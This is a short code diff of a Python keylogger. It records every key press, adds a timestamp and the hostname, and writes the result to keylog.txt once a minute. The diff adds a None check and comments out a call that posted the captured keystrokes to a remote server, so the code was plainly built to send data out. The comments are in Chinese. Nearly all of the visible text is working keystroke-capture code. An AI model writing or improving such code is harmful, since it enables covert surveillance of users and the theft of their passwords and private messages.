@@ -3,7 +3,6 @@ import logging
 import threading
 import time
 import socket
-import request
 
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')
 
@@ -22,8 +21,10 @@ def on_press(key):
         # 处理特殊键
         char = str(key)
 
-    with lock:
-        buffer.append(char)
+    # 确保 char 不为 None
+    if char is not None:
+        with lock:
+            buffer.append(char)
 
 def write_buffer():
     global buffer
@@ -32,8 +33,8 @@ def write_buffer():
             timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
             log_entry = f"{timestamp} - {hostname}: {' '.join(buffer)}"
             logging.info(log_entry)
-            ret = request.send_post_request(timestamp, hostname, ' '.join(buffer))
-            logging.info('Requests sending result: ' + str(ret))
+            # ret = request.send_post_request(timestamp, hostname, ' '.join(buffer))
+            # logging.info('Requests sending result: ' + str(ret))
             buffer = []
     # 再次启动定时器
     threading.Timer(60, write_buffer).start()
